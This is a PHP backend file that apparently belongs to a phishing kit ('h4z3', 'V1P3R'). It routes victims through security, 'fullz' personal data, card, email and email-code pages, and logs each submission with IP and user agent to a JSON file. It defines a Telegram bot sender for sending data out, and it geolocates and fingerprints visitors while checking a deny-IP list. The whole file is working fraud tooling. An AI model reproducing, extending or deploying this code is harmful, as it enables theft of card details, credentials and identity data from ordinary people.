<?php 
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

function h4z3_can_use_curl()
{
    return function_exists('curl_init')
        && function_exists('curl_setopt')
        && function_exists('curl_exec');
}

function h4z3_is_toggle_enabled($value)
{
    if ($value === null) {
        return true;
    }

    if (is_bool($value)) {
        return $value;
    }

    return strtolower(trim((string) $value)) !== 'off';
}

function h4z3_build_step_path($path, $basePath)
{
    $basePath = (string) $basePath;

    if ($basePath === '') {
        return $path;
    }

    $normalizedBase = rtrim($basePath, '/\\');
    if ($normalizedBase !== '') {
        $normalizedBase .= '/';
    }

    return $normalizedBase . ltrim($path, '/\\');
}

function h4z3_render_encoded_page($html)
{
    if (!is_string($html)) {
        $html = (string) $html;
    }

    if (!headers_sent()) {
        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        header('Pragma: no-cache');
        header('Expires: 0');
    }

    echo $html;
}

function h4z3_get_flow_steps()
{
    global $securitypage, $fullzpage, $debitpage, $mailpage, $codepage;

    $steps = [];
    $mailEnabled = false;
    $codeEnabled = false;

    if (h4z3_is_toggle_enabled($securitypage ?? null)) {
        $steps[] = [
            'key' => 'security',
            'path' => 'security.php',
        ];
    }

    if (h4z3_is_toggle_enabled($fullzpage ?? null)) {
        $steps[] = [
            'key' => 'fullz',
            'path' => 'personal.php',
        ];
    }

    if (h4z3_is_toggle_enabled($debitpage ?? null)) {
        $steps[] = [
            'key' => 'card',
            'path' => 'card.php',
        ];
    }

    if (h4z3_is_toggle_enabled($mailpage ?? null)) {
        $steps[] = [
            'key' => 'email',
            'path' => 'mail.php',
        ];
        $mailEnabled = true;
    }

    if ($mailEnabled && h4z3_is_toggle_enabled($codepage ?? null)) {
        $steps[] = [
            'key' => 'loading',
            'path' => 'loading.php',
            'is_transitional' => true,
        ];
        $codeEnabled = true;
    }

    if ($mailEnabled && $codeEnabled) {
        $steps[] = [
            'key' => 'code',
            'path' => 'Code.php',
        ];
        $steps[] = [
            'key' => 'loading_code',
            'path' => 'loading_code.php',
            'is_transitional' => true,
        ];
    }

    return $steps;
}

function h4z3_get_progress_steps()
{
    $steps = h4z3_get_flow_steps();

    return array_values(array_filter($steps, function ($step) {
        return empty($step['is_transitional']);
    }));
}

function h4z3_calculate_progress($stepKey)
{
    $steps = h4z3_get_flow_steps();
    $progressSteps = h4z3_get_progress_steps();
    $totalSteps = count($progressSteps);

    $currentStep = null;
    $effectiveKey = $stepKey;
    $stepIndex = null;

    foreach ($steps as $index => $step) {
        if (($step['key'] ?? null) === $stepKey) {
            $stepIndex = $index;
            break;
        }
    }

    if ($stepIndex === null) {
        return [
            'current' => null,
            'total' => $totalSteps,
            'steps' => $progressSteps,
        ];
    }

    $isTransitional = !empty($steps[$stepIndex]['is_transitional']);

    if ($isTransitional) {
        for ($i = $stepIndex - 1; $i >= 0; $i--) {
            if (empty($steps[$i]['is_transitional'])) {
                $effectiveKey = $steps[$i]['key'];
                break;
            }
        }

        if ($effectiveKey === $stepKey) {
            $stepCount = count($steps);
            for ($i = $stepIndex + 1; $i < $stepCount; $i++) {
                if (empty($steps[$i]['is_transitional'])) {
                    $effectiveKey = $steps[$i]['key'];
                    break;
                }
            }
        }
    }

    foreach ($progressSteps as $index => $step) {
        if (($step['key'] ?? null) === $effectiveKey) {
            $currentStep = $index + 1;
            break;
        }
    }

    return [
        'current' => $currentStep,
        'total' => $totalSteps,
        'steps' => $progressSteps,
    ];
}

function h4z3_get_first_step_path($basePath = '')
{
    $steps = h4z3_get_flow_steps();

    if (empty($steps)) {
        return h4z3_build_step_path('complete.php', $basePath);
    }

    return h4z3_build_step_path($steps[0]['path'], $basePath);
}

function h4z3_get_next_step_path($currentKey, $basePath = '')
{
    $steps = h4z3_get_flow_steps();
    $found = false;
    $nextPath = null;

    foreach ($steps as $index => $step) {
        if ($step['key'] === $currentKey) {
            $found = true;
            if (isset($steps[$index + 1])) {
                $nextPath = $steps[$index + 1]['path'];
            } else {
                $nextPath = 'complete.php';
            }
            break;
        }
    }

    if (!$found) {
        if (!empty($steps)) {
            return h4z3_get_first_step_path($basePath);
        }

        return h4z3_build_step_path('complete.php', $basePath);
    }

    return h4z3_build_step_path($nextPath, $basePath);
}

function h4z3_is_step_active($key)
{
    $steps = h4z3_get_flow_steps();

    foreach ($steps as $step) {
        if ($step['key'] === $key) {
            return true;
        }
    }

    return false;
}

function h4z3_get_session_storage_path()
{
    static $storageAvailable = null;
    global $sessionStoragePath;

    if ($storageAvailable === false) {
        return null;
    }

    if (empty($sessionStoragePath)) {
        $sessionStoragePath = __DIR__ . '/../storage/session_data.json';
    }

    if (!function_exists('file_put_contents') || !function_exists('mkdir')) {
        $storageAvailable = false;
        return null;
    }

    $directory = dirname($sessionStoragePath);
    if (!is_dir($directory)) {
        if (!@mkdir($directory, 0755, true) && !is_dir($directory)) {
            $storageAvailable = false;
            return null;
        }
    }

    if (!file_exists($sessionStoragePath)) {
        $initialPayload = json_encode(["sessions" => []], JSON_PRETTY_PRINT);
        if (@file_put_contents($sessionStoragePath, $initialPayload, LOCK_EX) === false) {
            $storageAvailable = false;
            return null;
        }
    }

    $storageAvailable = true;
    return $sessionStoragePath;
}

function h4z3_initialize_tracking_session()
{
    static $initializationFailed = false;

    if ($initializationFailed) {
        return null;
    }

    try {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
    } catch (Throwable $throwable) {
        $initializationFailed = true;
        return null;
    }

    if (empty($_SESSION['h4z3_tracking_id'])) {
        $sessionId = session_id();

        if (empty($sessionId)) {
            try {
                $sessionId = bin2hex(random_bytes(16));
            } catch (Throwable $throwable) {
                $initializationFailed = true;
                return null;
            }
        }

        $_SESSION['h4z3_tracking_id'] = $sessionId;
    }

    return $_SESSION['h4z3_tracking_id'];
}

function h4z3_load_session_store()
{
    $path = h4z3_get_session_storage_path();

    if ($path === null || !is_readable($path)) {
        return null;
    }

    $contents = @file_get_contents($path);
    if ($contents === false || $contents === '') {
        $decoded = ["sessions" => []];
    } else {
        $decoded = json_decode($contents, true);
        if (!is_array($decoded)) {
            $decoded = ["sessions" => []];
        }
    }

    if (!isset($decoded['sessions']) || !is_array($decoded['sessions'])) {
        $decoded['sessions'] = [];
    }

    return $decoded;
}

function h4z3_write_session_store(array $store)
{
    $path = h4z3_get_session_storage_path();

    if ($path === null) {
        return false;
    }

    return @file_put_contents($path, json_encode($store, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX) !== false;
}

function h4z3_get_current_timestamp()
{
    return gmdate('c');
}

function h4z3_ensure_session_record(array &$store, $sessionId)
{
    if (!isset($store['sessions'][$sessionId]) || !is_array($store['sessions'][$sessionId])) {
        $store['sessions'][$sessionId] = [];
    }

    if (!isset($store['sessions'][$sessionId]['entries']) || !is_array($store['sessions'][$sessionId]['entries'])) {
        $store['sessions'][$sessionId]['entries'] = [];
    }

    if (!isset($store['sessions'][$sessionId]['failed_channels']) || !is_array($store['sessions'][$sessionId]['failed_channels'])) {
        $store['sessions'][$sessionId]['failed_channels'] = [];
    }

    if (!array_key_exists('pending_action', $store['sessions'][$sessionId])) {
        $store['sessions'][$sessionId]['pending_action'] = null;
    }

    if (empty($store['sessions'][$sessionId]['last_seen'])) {
        $store['sessions'][$sessionId]['last_seen'] = h4z3_get_current_timestamp();
    }
}

function h4z3_store_submission($step, array $payload)
{
    $sessionId = h4z3_initialize_tracking_session();
    $store = h4z3_load_session_store();

    if ($sessionId === null || $store === null) {
        return false;
    }

    h4z3_ensure_session_record($store, $sessionId);

    $normalizedPayload = [];
    foreach ($payload as $key => $value) {
        if (is_scalar($value) || is_null($value)) {
            $normalizedPayload[$key] = $value;
        } else {
            $normalizedPayload[$key] = json_encode($value);
        }
    }

    $timestamp = h4z3_get_current_timestamp();

    $entry = [
        'timestamp' => $timestamp,
        'step' => $step,
        'payload' => $normalizedPayload,
        'meta' => [
            'ip' => $_SERVER['REMOTE_ADDR'] ?? null,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
        ],
    ];

    $store['sessions'][$sessionId]['entries'][] = $entry;
    $store['sessions'][$sessionId]['last_updated'] = $timestamp;
    $store['sessions'][$sessionId]['last_seen'] = $timestamp;

    return h4z3_write_session_store($store);
}

function h4z3_mark_channel_failure($channel)
{
    $sessionId = h4z3_initialize_tracking_session();
    $store = h4z3_load_session_store();

    if ($sessionId === null || $store === null) {
        return false;
    }

    h4z3_ensure_session_record($store, $sessionId);

    if (!in_array($channel, $store['sessions'][$sessionId]['failed_channels'], true)) {
        $store['sessions'][$sessionId]['failed_channels'][] = $channel;
    }

    $store['sessions'][$sessionId]['last_seen'] = h4z3_get_current_timestamp();

    return h4z3_write_session_store($store);
}

function h4z3_send_telegram($message, $botUrl, $chatId)
{
    if (!function_exists('curl_init') || !function_exists('curl_setopt') || !function_exists('curl_exec')) {
        return false;
    }

    if (empty($botUrl) || empty($chatId)) {
        return false;
    }

    $endpoint = "https://api.telegram.org/{$botUrl}/sendMessage";
    $ch = @curl_init($endpoint);

    if (!$ch) {
        return false;
    }

    $payload = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $optionsApplied = @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)
        && @curl_setopt($ch, CURLOPT_POST, 1)
        && @curl_setopt($ch, CURLOPT_POSTFIELDS, $payload)
        && @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $result = false;

    if ($optionsApplied) {
        $response = @curl_exec($ch);
        $result = ($response !== false);
    }

    if (is_resource($ch) || is_object($ch)) {
        @curl_close($ch);
    }

    return $result;
}
###########################################################
$ip2 = getUserIP();
if($ip2 == "127.0.0.1") {
    $ip2 = "";
}
###########################################################
$ip = getUserIP();
if($ip == "127.0.0.1") {
    $ip = "";
}
###########################################################
function get_ip1($ip2) {
    if (!h4z3_can_use_curl()) {
        return null;
    }

    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    if ($resp === false) {
        return null;
    }

    return $resp;
}
###########################################################
function get_ip2($ip) {
    if (!h4z3_can_use_curl()) {
        return null;
    }

    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    if ($resp === false) {
        return null;
    }

    return $resp;
}
###########################################################
$details = get_ip1($ip2);

if ($details === null) {
    if (!h4z3_can_use_curl()) {
        trigger_error('Geolocation skipped because cURL is disabled.', E_USER_NOTICE);
    }

    $details = [];
    $countryname = '';
    $countrycode = '';
    $data="../V1P3R/img/icon.ico";$deny='google-images';
    $cn = '';
    $cid = '';
    $continent = '';
    $citykota = '';
    $regioncity = '';
    $timezone = '';
    $kurenci = '';
} else {
    $details = json_decode($details, true);
    if (!is_array($details)) {
        error_log('GeoPlugin response decoding failed or returned no data.');
        $details = [];
    }
    $countryname = $details['geoplugin_countryName'] ?? '';
    $countrycode = $details['geoplugin_countryCode'] ?? '';
    $data="../V1P3R/img/icon.ico";$deny='google-images';
    $cn = $countryname;
    $cid = $countrycode;
    $continent = $details['geoplugin_continentName'] ?? '';
    $citykota = $details['geoplugin_city'] ?? '';
    $regioncity = $details['geoplugin_region'] ?? '';
    $timezone = $details['geoplugin_timezone'] ?? '';
    $kurenci = $details['geoplugin_currencySymbol_UTF8'] ?? '';

    $secondaryDetails = get_ip2($ip2);
    if ($secondaryDetails === null) {
        $details = [];
    } else {
        $details = json_decode($secondaryDetails, true);
    }
}
###########################################################
function getIp() {
	    foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
	                $IPaddress = trim($IPaddress);
	                if (filter_var($IPaddress,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $IPaddress;
	                }
	            }
	        }
	    }
	}
###########################################################
function clientData($ss) {
                if (!h4z3_can_use_curl()) {
                    return null;
                }

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_URL,"http://www.geoplugin.net/json.gp?ip=".getIp());
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
                curl_setopt($ch, CURLOPT_TIMEOUT, 400);
                $json = curl_exec($ch);
                curl_close($ch);

            if ($json == false) {
                return "127.0.0.1";
            }
                $code = json_decode($json);
            switch ($ss) {
                case "code":
                    $str = $code->geoplugin_countryCode;
                    break;
                case "country":
                    $str = $code->geoplugin_countryName;
                    break;
                case "city":
                    $str = $code->geoplugin_city;
                    break;
                case "state":
                    $str = $code->geoplugin_region;
                    break;
                case "timezone":
                    $str = $code->geoplugin_timezone;
                    break;
                case "currency":
                    $str = $code->geoplugin_currencyCode;
                    break;
                default:
                    $str = $code->geoplugin_request;
            }
                return $str;
        }
###########################################################
function accessOneTimeIP($ip){
	$text = file_get_contents("denyip.txt");
	$ipArray = explode("\n", $text);
	if (in_array($ip, $ipArray)) {
		return false;
	}else{
		return true;
	}
}
###########################################################
function getOs() {
	    $os_platform = "Unknown OS";
	    $all       =   array(
	                            '/windows nt 10/i'     =>  'Windows 10',
	                            '/windows nt 6.3/i'     =>  'Windows 8.1',
	                            '/windows nt 6.2/i'     =>  'Windows 8',
	                            '/windows nt 6.1/i'     =>  'Windows 7',
	                            '/windows nt 6.0/i'     =>  'Windows Vista',
	                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                            '/windows nt 5.1/i'     =>  'Windows XP',
	                            '/windows xp/i'         =>  'Windows XP',
	                            '/windows nt 5.0/i'     =>  'Windows 2000',
	                            '/windows me/i'         =>  'Windows ME',
	                            '/win98/i'              =>  'Windows 98',
	                            '/win95/i'              =>  'Windows 95',
	                            '/win16/i'              =>  'Windows 3.11',
	                            '/macintosh|mac os x/i' =>  'Mac OS X',
	                            '/mac_powerpc/i'        =>  'Mac OS 9',
	                            '/linux/i'              =>  'Linux',
	                            '/ubuntu/i'             =>  'Ubuntu',
	                            '/iphone/i'             =>  'iPhone',
	                            '/ipod/i'               =>  'iPod',
	                            '/ipad/i'               =>  'iPad',
	                            '/android/i'            =>  'Android',
	                            '/blackberry/i'         =>  'BlackBerry',
	                            '/webos/i'              =>  'Mobile');
	    foreach ($all as $regex => $value) { 
	        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
	            $os_platform = $value;
	        }
	    }   
	    return $os_platform;
	}
###########################################################
function getBrowser() {
	    $browser = "Unknown Browser";
	    $all  =   array(
                        '/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
	    foreach ($all as $regex => $value) { 
	        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
	            $browser = $value;
	        }
	    }
	    return $browser;
	}
$br   = getBrowser();
$os   = getOs();
$date = date("d M, Y");
$time = date("g:i a");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
$key = substr(sha1(mt_rand()),1,25);
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");